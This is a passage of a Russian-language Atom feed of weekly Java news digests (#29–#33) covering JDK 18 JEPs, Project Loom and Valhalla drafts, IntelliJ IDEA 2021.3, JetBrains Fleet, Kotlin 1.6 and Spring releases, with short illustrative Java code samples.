  &lt;li&gt;Открывание ссылок во внешнем браузере вместо внутреннего&lt;/li&gt;
  &lt;li&gt;Улучшения в тёмной теме&lt;/li&gt;
  &lt;li&gt;Улучшение времени старта IDE&lt;/li&gt;
  &lt;li&gt;Улучшения в EGit и JS-редакторе&lt;/li&gt;
&lt;/ul&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #33</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_33.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_33.html</id>
    <updated>2021-12-05T17:00:00Z</updated>
    <published>2021-12-05T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Ещё один JEP предложен к Java 18: &lt;a href="https://openjdk.java.net/jeps/421"&gt;Deprecate Finalization for Removal (JEP 421)&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В проекте Valhalla появился новый черновик JEP: &lt;a href="http://openjdk.java.net/jeps/8277163"&gt;Value Objects (Preview)&lt;/a&gt;. В нём предлагается ввести новый тип объектов в Java: value-объекты.&lt;/p&gt;
&lt;p&gt;Value-объекты отличаются от классических объектов тем, что не имеют identity. Это позволяет улучшить производительность при использовании таких объектов и уменьшить занимаемое ими место в памяти. Также value-объекты являются полностью иммутабельными, всегда являются &lt;code&gt;final&lt;/code&gt; и не могут иметь &lt;code&gt;synchronized&lt;/code&gt;-методов.&lt;/p&gt;
&lt;p&gt;Однако, в отличие от примитивных объектов (&lt;a href="https://openjdk.java.net/jeps/401"&gt;JEP 401&lt;/a&gt;), которые также имеют все вышеописанные свойства, value-объекты являются ссылочными, поэтому являются nullable.&lt;/p&gt;
&lt;p&gt;Таким образом, если в Valhalla всё будет реализовано согласно такой модели, то в Java будет три типа объектов: identity-объекты, value-объекты и примитивные объекты.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://blog.jetbrains.com/idea/2021/11/intellij-idea-2021-3/"&gt;IntelliJ IDEA 2021.3&lt;/a&gt;. Перечислим некоторые заметные изменения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;В Ultimate версии появилась возможность &lt;a href="https://blog.jetbrains.com/blog/2021/11/29/introducing-remote-development-for-jetbrains-ides/"&gt;удалённой разработки&lt;/a&gt;. Развернув бэкенд IDEA на удалённом сервере, к нему можно подключиться и работать из любой точки мира. Функция пока работает в Beta-режиме.&lt;/li&gt;
  &lt;li&gt;Новая функция &lt;i&gt;Repair IDE&lt;/i&gt; позволяет быстро диагностировать и устранять наиболее распространённые неполадки.&lt;/li&gt;
  &lt;li&gt;Возможность изменить шрифт во всех вкладках одновременно с помощью &lt;code&gt;Ctrl&lt;/code&gt; и колеса мыши.&lt;/li&gt;
  &lt;li&gt;Улучшенный предпросмотр результатов &lt;a href="https://www.jetbrains.com/help/idea/intention-actions.html"&gt;intention-действий&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Возможность разделения окна &lt;i&gt;Run&lt;/i&gt; на несколько вкладок.&lt;/li&gt;
  &lt;li&gt;Поиск действий в &lt;i&gt;Search Everywhere&lt;/i&gt; теперь тоже использует машинное обучение (ранее в IDEA 2020.3 машинное обучение было введено для Code Completion).&lt;/li&gt;
  &lt;li&gt;Новые инспекции в Java: отслеживание небезопасных строк (SQL-инъекция, XSS, конфиденциальные данные и т.п.), замена &lt;code&gt;collect(toList())&lt;/code&gt; на &lt;code&gt;toList()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;При выполнении рефакторинга &lt;i&gt;Introduce Local Variable&lt;/i&gt; теперь не всплывает окно с настройками, а появляется значок шестерёнки. А при выполнении рефакторинга &lt;i&gt;Introduct Parameter&lt;/i&gt; среда теперь спрашивает, где нужно заменить вхождения, и тоже показывает значок шестерёнки.&lt;/li&gt;
  &lt;li&gt;В &lt;i&gt;Run/Debug Configurations&lt;/i&gt; теперь можно настраивать classpath, вручную добавляя туда отдельные записи или исключая ненужные.&lt;/li&gt;
  &lt;li&gt;Множество новых улучшений в Kotlin: действие &lt;i&gt;Smart Step Into&lt;/i&gt; в отладчике, &lt;code&gt;inline&lt;/code&gt;-функции в стек-трейсе, рефакторинг &lt;i&gt;Extract Constant&lt;/i&gt;, улучшенная инспекция &lt;i&gt;Possibly blocking call in non-blocking context&lt;/i&gt;, подсказки для диапазонов, улучшенный мастер создания проектов.&lt;/li&gt;
  &lt;li&gt;Async Profiler 2.0 теперь доступен в Windows-версии IntelliJ IDEA Ultimate из коробки.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Компания JetBrains анонсировала свою новую среду разработки &lt;a href="https://blog.jetbrains.com/ru/blog/2021/11/29/welcome-to-fleet/"&gt;Fleet&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Fleet &amp;ndash; это созданная с нуля среда разработки, которая представляет собой легковесный редактор с базовыми возможностями, но с возможностью включения smart-режима, при котором она превращается в полнофункциональную IDE. В отличие от классических IDE JetBrains, каждая из которых создана для одной конкретной технологии, Fleet поддерживает разные технологии в рамках одного приложения (на текущий момент есть поддержка Java, Kotlin, Python, Go, JavaScript, Rust, TypeScript, JSON). Fleet имеет &lt;a href="https://www.jetbrains.com/help/fleet/1.0/architecture-overview.html"&gt;распределённую архитектуру&lt;/a&gt;, в которой фронтенд отделён от бэкенда, что позволяет использовать среду не только локально, но и в распределённых сценариях: удалённая, облачная, совместая разработка и т.д.&lt;/p&gt;
&lt;p&gt;В данный момент Fleet недоступен широкому кругу пользователей, и работает программа Fleet Preview, в которой, однако, &lt;a href="https://twitter.com/JetBrains_Fleet/status/1466705214761840643"&gt;закончился приём заявок &lt;/a&gt; из-за большого наплыва желающих протестировать новую IDE.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел выпуск &lt;a href="https://blog.jetbrains.com/idea/2021/12/java-annotated-monthly-december-2021/"&gt;Java Annotated Monthly&lt;/a&gt; от JetBrains за декабрь 2021.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://maven.apache.org/docs/3.8.4/release-notes.html"&gt;Apache Maven 3.8.4&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="http://www.h2database.com/html/changelog.html"&gt;вторая версия&lt;/a&gt; H2, популярной SQL СУБД, написанной полностью на Java. Это произошло спустя 16 лет после выхода первой версии.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://mail.openjdk.java.net/pipermail/jcstress-dev/2021-December/000965.html"&gt;JCStress 0.15&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #32</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_32.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_32.html</id>
    <updated>2021-11-21T17:00:00Z</updated>
    <published>2021-11-21T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышел &lt;a href="https://blog.jetbrains.com/kotlin/2021/11/kotlin-1-6-0-is-released/"&gt;Kotlin 1.6&lt;/a&gt;. Перечислим самые заметные изменения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Проверка исчерпываемости в &lt;code&gt;when&lt;/code&gt;-стейтментах: если &lt;code&gt;when&lt;/code&gt; не покрывает все возможные ветки (например, все подклассы sealed-класса), то компилятор выдаёт предупреждение. В Kotlin 1.7 такие предупреждения станут ошибкой.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;suspend&lt;/code&gt; функциональные типы теперь могут быть суперинтерфейсами (т.е. можно писать, например, &lt;code&gt;class MyClickAction : suspend () -&gt; Unit)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Автоматические конверсии из обычных функциональных типов к соответствующим &lt;code&gt;suspend&lt;/code&gt; функциональным типам.&lt;/li&gt;
  &lt;li&gt;Улучшенный вывод типов для рекурсивных generic типов.&lt;/li&gt;
  &lt;li&gt;Возможность разработки, используя три предыдущих версии API (т.е. 1.3, 1.4 и 1.5 для 1.6). Раньше поддерживалось только две предыдущих версии API.&lt;/li&gt;
  &lt;li&gt;Поддержка повторяющихся аннотаций с удержанием в рантайме.
  &lt;li&gt;Появились две новые функции: &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.io/readln.html"&gt;&lt;code&gt;readln()&lt;/code&gt;&lt;/a&gt;, которая возвращает non-nullable String, и &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.io/readln-or-null.html"&gt;&lt;code&gt;readlnOrNull()&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;API стали стабильными: &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.reflect/type-of.html"&gt;&lt;code&gt;typeOf()&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.time/-duration/"&gt;&lt;code&gt;Duration&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.time/-duration-unit/"&gt;&lt;code&gt;DurationUnit&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.collections/build-list.html"&gt;билдеры коллекций&lt;/a&gt;, &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin.text/split-to-sequence.html"&gt;&lt;code&gt;splitToSequence()&lt;/code&gt;&lt;/a&gt; с Regex, операции &lt;a href="https://kotlinlang.org/api/latest/jvm/stdlib/kotlin/rotate-right.html"&gt;битового поворота&lt;/a&gt; чисел.&lt;/li&gt;
  &lt;li&gt;Функцию &lt;code&gt;compareTo()&lt;/code&gt; теперь можно вызывать через инфиксную нотацию (&lt;code&gt;x compareTo y&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Очередных два JEP'а предложены к JDK 18. Это &lt;a href="https://openjdk.java.net/jeps/419"&gt;JEP 419: Foreign Function &amp; Memory API (Second Incubator)&lt;/a&gt; и &lt;a href="https://openjdk.java.net/jeps/420"&gt;JEP 420: Pattern Matching for switch (Second Preview)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Также появился новый &lt;a href="https://openjdk.java.net/jeps/422"&gt;JEP 422: Linux/RISC-V Port&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В &lt;a href="https://wiki.openjdk.java.net/display/loom/Main"&gt;проекте Loom&lt;/a&gt; появились первые два черновика JEP.&lt;/p&gt;
&lt;p&gt;Первый &amp;ndash; &lt;a href="http://openjdk.java.net/jeps/8277129"&gt;Structured Concurrency (Preview)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;В этом JEP'е предлагается добавить в Java новое API для структурного concurrency. Структурное concurrency &amp;ndash; это concurrency, которое заимствует принципы обычного (последовательного) структурного программирования и гарантирует следующее: когда поток выполнения разделяется на несколько потоков выполнения, то эти потоки воссоединяются в том же блоке кода. Все эти потоки логически сгруппированы и организованы в иерархию.&lt;/p&gt;
&lt;p&gt;Рассмотрим простой пример кода, выполняющийся последовательно:&lt;/p&gt;
&lt;pre&gt;String foo() &lt;span style="color: blue"&gt;throws&lt;/span&gt; IOException, InterruptedException {
    &lt;span style="color: blue"&gt;int&lt;/span&gt; bar = bar(); &lt;span style="color: green"&gt;// throws IOException, InterruptedException&lt;/span&gt;
    String baz = baz(); &lt;span style="color: green"&gt;// то же самое&lt;/span&gt;
    &lt;span style="color: blue"&gt;return&lt;/span&gt; baz + bar;
}&lt;/pre&gt;
&lt;p&gt;В этом коде нет ничего сверхестественного, и он чрезвычайно прост и надёжен. Но если необходимо выполнить операции &lt;code&gt;bar()&lt;/code&gt; и &lt;code&gt;baz()&lt;/code&gt; параллельно, то трансформировать этот код с сохранением всех структурных гарантий, используя существующие средства Java, будет не так уж и просто.&lt;/p&gt;
&lt;p&gt;Новый предложенный класс &lt;code&gt;StructuredExecutor&lt;/code&gt; призван, чтобы решить эту проблему. С его использованием аналогичный распараллеленный код будет выглядеть следующим образом:&lt;/p&gt;
&lt;pre&gt;String foo() &lt;span style="color: blue"&gt;throws&lt;/span&gt; IOException, InterruptedException {
    &lt;span style="color: blue"&gt;try&lt;/span&gt; (&lt;span style="color: blue"&gt;var&lt;/span&gt; s = StructuredExecutor.open()) {
        &lt;span style="color: blue"&gt;var&lt;/span&gt; handler = &lt;span style="color: blue"&gt;new&lt;/span&gt; StructuredExecutor.ShutdownOnFailure();
        Future&amp;lt;Integer&amp;gt; bar = s.fork(() -&gt; bar(), handler);
        Future&amp;lt;String&amp;gt; baz = s.fork(() -&gt; baz(), handler);

        s.join();
        handler.throwIfFailed();

        &lt;span style="color: blue"&gt;return&lt;/span&gt; baz.resultNow() + bar.resultNow();
    } &lt;span style="color: blue"&gt;catch&lt;/span&gt; (ExecutionException e) {
        &lt;span style="color: blue"&gt;if&lt;/span&gt; (e.getCause() &lt;span style="color: blue"&gt;instanceof&lt;/span&gt; IOException ioe) throw ioe;
        &lt;span style="color: blue"&gt;throw new&lt;/span&gt; RuntimeException(e);
   }
}&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;StructuredExecutor&lt;/code&gt; в данном случае обеспечивает множество гарантий. Например, если одна из операций &lt;code&gt;bar()&lt;/code&gt; и &lt;code&gt;baz()&lt;/code&gt; завершается ошибкой, то другая операция отменяется автоматически (если ещё не завершена). Или если операция &lt;code&gt;foo()&lt;/code&gt; прерывается в процессе ожидания &lt;code&gt;join()&lt;/code&gt;, то обе операции &lt;code&gt;bar()&lt;/code&gt; и &lt;code&gt;baz()&lt;/code&gt; отменяются. Всех этих гарантий не было бы, если бы использовались существующие реализации &lt;code&gt;ExecutorService&lt;/code&gt;. Чтобы эти гарантии обеспечить, пришлось бы для этого написать большое количество дополнительного кода.&lt;/p&gt;
&lt;p&gt;Таким образом, новое API значительно облегчит написание чистого и корректного конкурентного кода с использованием структурного подхода.&lt;/p&gt;

&lt;p class="pt-2"&gt;Второй JEP &amp;ndash; это &lt;a href="http://openjdk.java.net/jeps/8277131"&gt;Virtual Threads (Preview)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Виртуальные нити &amp;ndash; это новый вид нитей (т.е. новый подкласс &lt;code&gt;java.lang.Thread&lt;/code&gt;), которые, в отличие от нитей операционной системы, могут хорошо масштабироваться до миллионов экземпляров. При этом поведение таких нитей практически не отличается от обычных, а значит существующий конкурентный код можно будет смигрировать на виртуальные нити, не затрачивая больших усилий. Виртуальные нити являются пользовательской надстройкой и работают поверх нитей операционной системы, поэтому существуют только для JVM, но не для OS.&lt;/p&gt;
&lt;p&gt;Отличительной особенностью виртуальных нитей является то, что при блокирующем вызове они приостанавливаются, позволяя нити-носителю продолжить выполнять другие задачи. Когда блокирующая операция завершается, виртуальная нить помещается в очередь планировщика и её выполнение возобновляется на той же или уже совсем другой нити-носителе.&lt;/p&gt;
&lt;p&gt;Вместе с виртуальным нитями также вводится большое количество нового API:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;Thread.Builder&lt;/code&gt; &amp;ndash; билдер нитей. Например, виртуальную нить можно создать путём вызова &lt;code&gt;Thread.ofVirtual().name("name").unstarted(runnable)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Thread.startVirtualThread(Runnable)&lt;/code&gt; &amp;ndash; удобный метод, позволяющий создать и сразу же запустить виртуальную нить.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Thread.isVirtual()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Thread.join(Duration)&lt;/code&gt; и &lt;code&gt;Thread.sleep(Duration)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Executors.newVirtualThreadExecutor()&lt;/code&gt; и &lt;code&gt;Executors.newThreadPerTaskExecutor()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Future.join()&lt;/code&gt;, &lt;code&gt;Future.state()&lt;/code&gt; и &lt;code&gt;Future.isCompletedNormally()&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;ExecutorService&lt;/code&gt; теперь является AutoCloseable.&lt;/li&gt;
  &lt;li&gt;И другие.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Для виртуальных нитей также добавляется поддержка в дебаггере, JVM TI и Java Flight Recorder.&lt;/p&gt;
&lt;p&gt;В целом виртуальные нити должны значительно облегчить написание конкурентных программ, избавя от необходимости прибегать к асинхронным API во многих случаях.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://spring.io/blog/2021/11/19/spring-boot-2-6-is-now-available"&gt;Spring Boot 2.6&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #31</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_31.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_31.html</id>
    <updated>2021-11-14T17:00:00Z</updated>
    <published>2021-11-14T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Появилось &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-November/006199.html"&gt;расписание выхода JDK 18&lt;/a&gt;. По плану общедоступная версия Java 18 должна выйти 22 марта 2022 года.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел новый &lt;a href="http://openjdk.java.net/jeps/421"&gt;JEP 421: Deprecate Finalization for Removal&lt;/a&gt;. В нём предлагается пометить все методы, относящиеся к финализации, как deprecated for removal, а также добавить опцию командной строки, позволяющую отключить финализацию во время выполнения. Кроме того, в будущих версиях JDK предлагается отключить финализацию по умолчанию с возможностью включения, затем отключить полностью, а потом удалить, наконец, весь API финализации.&lt;/p&gt;
&lt;p&gt;Финализация &amp;ndash; это механизм, который присутствовал в Java с момента её появления. Со временем стало понятно, что у &lt;code&gt;finalize()&lt;/code&gt; есть серьёзные недостатки: проблемы безопасности (возможность утечки и возрождения финализируемого объекта, возможность &amp;laquo;сломать&amp;raquo; объект и привести его в неконсистентное состояние), проблемы производительности (замедление работы сборщика мусора, увеличение потребляемой памяти из-за дополнительных объектов и вспомогательных структур данных GC), отсутствие гибкости (невозможность отмены финализации, отсутствие контроля потоков, которые будут вызывать финализацию), сложная программная модель (риск забыть вызвать &lt;code&gt;super.finalize()&lt;/code&gt; в подклассе) и т.д. Это привело к тому, что в Java 9 метод &lt;a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Object.html#finalize--"&gt;Object.finalize()&lt;/a&gt; стал помечен как deprecated. Теперь настало время идти дальше в сторону полного отказа от финализации.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В Java 18 был интегрирован &lt;a href="https://openjdk.java.net/jeps/418"&gt;JEP 418: Internet-Address Resolution SPI&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_24.html"&gt;выпуске #24&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Появилось два новых черновика JEP: &lt;a href="http://openjdk.java.net/jeps/8276094"&gt;Region Pinning in G1&lt;/a&gt; и &lt;a href="http://openjdk.java.net/jeps/8276797"&gt;Linux/RISC-V Port&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; JUG.ru выложил &lt;a href="https://www.youtube.com/playlist?list=PLVe-2wcL84b-weU5FB9NslU-dmOJnsLW2"&gt;видео с JPoint 2021&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; JetBrains выпустил &lt;a href="https://blog.jetbrains.com/idea/2021/11/java-annotated-monthly-november-2021/"&gt;Java Annotated Monthly за ноябрь 2021&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://docs.gradle.org/7.3/release-notes.html"&gt;Gradle 7.3&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://github.com/amaembo/streamex/releases/tag/streamex-0.8.0"&gt;StreamEx 0.8.0&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #30</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_30.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_30.html</id>
    <updated>2021-10-24T17:00:00Z</updated>
    <published>2021-10-24T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышли обновления JDK:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/javase/17-0-1-relnotes.html"&gt;JDK 17.0.1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk-updates-dev/2021-October/009375.html"&gt;JDK 15.0.5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk-updates-dev/2021-October/009376.html"&gt;JDK 13.0.9&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk-updates-dev/2021-October/009368.html"&gt;JDK 11.0.13&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.java.net/pipermail/jdk8u-dev/2021-October/014373.html"&gt;JDK 8u312&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://jdk.java.net/18/"&gt;JDK 18-ea+20&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Новости JEP'ов:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/416"&gt;JEP 416: Reimplement Core Reflection with Method Handles&lt;/a&gt; предложен к &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-October/006163.html"&gt;JDK 18&lt;/a&gt;. Про этот JEP мы писали в &lt;a href="java_news_18.html"&gt;выпуске 18&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/420"&gt;JEP 420: Pattern Matching for switch (Second Preview)&lt;/a&gt; стал кандидатом (был черновиком).&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышли новые версии Spring:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://spring.io/blog/2021/10/14/spring-framework-5-3-11-and-5-2-18-available-now"&gt;Spring Framework 5.3.11 и 5.2.18&lt;/a&gt; (сразу после 5.3.11 вышел &lt;a href="https://spring.io/blog/2021/10/21/spring-framework-5-3-12-available-now"&gt;5.3.12&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://spring.io/blog/2021/10/18/spring-data-2021-0-6-and-2020-0-14-released"&gt;Spring Data 2021.0.6 и 2020.0.14&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Spring Boot &lt;a href="https://spring.io/blog/2021/10/21/spring-boot-2-5-6-is-now-available"&gt;2.5.6&lt;/a&gt; и &lt;a href="https://spring.io/blog/2021/10/21/spring-boot-2-4-12-is-now-available"&gt;2.4.12&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #29</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_29.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_29.html</id>
    <updated>2021-10-17T17:00:00Z</updated>
    <published>2021-10-17T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Очередной JEP &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-October/006157.html"&gt;запланирован&lt;/a&gt; в Java 18: &lt;a href="https://openjdk.java.net/jeps/408"&gt;Simple Web Server (JEP 408)&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_13.html"&gt;выпуске 13&lt;/a&gt;.&lt;/p&gt;
&lt;p class="pt-2"&gt;&amp;bull; Появился новый черновик JEP: &lt;a href="http://openjdk.java.net/jeps/8273326"&gt;Pattern Matching for &lt;code&gt;switch&lt;/code&gt; (Second Preview)&lt;/a&gt;. В рассылке начато &lt;a href="https://mail.openjdk.java.net/pipermail/amber-dev/2021-September/007090.html"&gt;обсуждение&lt;/a&gt; того, что можно улучшить в паттерн-матчинге в следующей версии Java. Перечислим некоторые идеи, которые обсуждаются.&lt;/p&gt;

&lt;p class="pt-1"&gt;Улучшенная проверка тотальности для дженериков. К примеру, есть иерархия:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;class&lt;/span&gt; A&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;class&lt;/span&gt; B&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;class&lt;/span&gt; C &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;String&amp;gt; { }&lt;/pre&gt;
&lt;p&gt;Тогда при паттерн-матчинге по переменной типа &lt;code&gt;Foo&amp;lt;Integer&amp;gt;&lt;/code&gt;, вариант &lt;code&gt;C&lt;/code&gt; рассматривать не нужно, потому что типы &lt;code&gt;Foo&amp;lt;String&amp;gt;&lt;/code&gt; и &lt;code&gt;Foo&amp;lt;Integer&amp;gt;&lt;/code&gt; несовместимы.&lt;/p&gt;

&lt;p class="pt-2"&gt;Улучшенный вывод типов при паттерн-матчинге. Сейчас необходимо указывать полный тип:&lt;/p&gt;
&lt;pre&gt;List&amp;lt;Integer&amp;gt; list = &lt;span style="color: blue"&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (list) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; ArrayList&amp;lt;Integer&amp;gt; arrayList -&gt; ...
    ...
}&lt;/pre&gt;
&lt;p&gt;Предлагается разрешить не указывать параметры и дать компилятору выводить их из целевого типа:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;case&lt;/span&gt; ArrayList arrayList -&gt; ... &lt;span style="color: green"&gt;// Выводится ArrayList&amp;lt;Integer&amp;gt;&lt;/span&gt;&lt;/pre&gt;

&lt;p class="pt-2"&gt;Улучшенная проверка покрытия в более сложных случаях:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; B1 &lt;span style="color: blue"&gt;extends&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; B2 &lt;span style="color: blue"&gt;extends&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; C &lt;span style="color: blue"&gt;extends&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;final class&lt;/span&gt; D1 &lt;span style="color: blue"&gt;implements&lt;/span&gt; B1, C {}
&lt;span style="color: blue"&gt;final class&lt;/span&gt; D2 &lt;span style="color: blue"&gt;implements&lt;/span&gt; B2, C {}
...
&lt;span style="color: blue"&gt;int&lt;/span&gt; i = &lt;span style="color: blue"&gt;switch&lt;/span&gt; (arg) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; B1 b1 -&gt; 1;
    &lt;span style="color: blue"&gt;case&lt;/span&gt; B2 b2 -&gt; 2;
};
&lt;/pre&gt;
&lt;p&gt;В Java 17 такой код не компилируется, хотя &lt;code&gt;switch&lt;/code&gt; покрывает все возможные случаи. Предлагается это исправить.&lt;/p&gt;

&lt;p class="pt-2"&gt;Добавить частичный порядок между паттернами с условиями и константами. Такой код не должен компилироваться и &lt;code&gt;case&lt;/code&gt; с константой должен быть объявлен выше:&lt;/p&gt;
&lt;pre&gt;switch (value) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; bar() -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; 3 -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; {}
}&lt;/pre&gt;

&lt;p class="pt-2"&gt;Запретить ставить ветку &lt;code&gt;default&lt;/code&gt; не в конец &lt;code&gt;switch&lt;/code&gt; (или хотя бы выдавать предупреждение):&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;switch&lt;/span&gt; (value) {
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt; {} &lt;span style="color: green"&gt;// Должна быть ошибка компиляции&lt;/span&gt;
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; i &gt; 0 -&gt; {}
}&lt;/pre&gt;

&lt;p class="pt-2"&gt;&amp;bull; &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2021-October/000309.html"&gt;Начато голосование&lt;/a&gt; по созданию проекта RISC-V Port. Предложение сделать официальный порт OpenJDK под архитектуру RISC-V &lt;a href="https://mail.openjdk.java.net/pipermail/discuss/2020-December/005657.html"&gt;было озвучено&lt;/a&gt; Huawei ещё в декабре 2020 года. Тогда это предложение получило положительную обратную связь, и за это время порт стал достаточно стабилен, чтобы началась работа по его интеграции в главную ветку JDK. Когда проект будет одобрен, планируется выпустить JEP с предложением по интеграции.&lt;/p&gt;

